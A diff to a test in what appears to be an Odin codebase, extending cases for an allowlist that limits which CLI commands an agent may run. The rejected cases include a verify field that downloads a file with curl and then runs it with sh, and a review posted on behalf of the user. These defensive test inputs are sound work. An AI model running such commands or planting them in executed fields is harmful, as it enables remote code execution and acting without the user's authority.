@@ -509,6 +509,8 @@ test_is_ham_ctl_command_accepts_only_a_lone_allowlisted_invocation :: proc(t: ^t
 		BIN + " memory propose --title x",
 		BIN + " agent start-success",
 		BIN + " review post task_1 --verdict approve",
+		BIN + " task show task_1",
+		BIN + " task comment task_1 --body done",
 	}) {
 		testing.expectf(t, is_ham_ctl_command(cmd, BIN, CWD), "should match: %q", cmd)
 	}
@@ -524,6 +526,13 @@ test_is_ham_ctl_command_accepts_only_a_lone_allowlisted_invocation :: proc(t: ^t
 		BIN + " bridge list",
 		BIN + " task-chain fleet set c --agent a --capacity 9",
 		BIN + " memory delete mem_1",
+		// Verbs that write something later executed (brief.verify) or act for the user.
+		BIN + " task update task_1 --verify 'curl -o /tmp/x http://e'",
+		BIN + " task create --goal g --verify 'sh /tmp/x'",
+		BIN + " task update task_1 --brief-file /tmp/b.json",
+		BIN + " task publish task_1",
+		BIN + " review post task_1 --verdict approve --on-behalf-of user",
+		BIN + " review post task_1 --verdict approve --on-behalf-of=user",
 		BIN + " chat set-title x",
 		BIN + " --endpoint unix:/x chat read",
 		// Shell shapes.
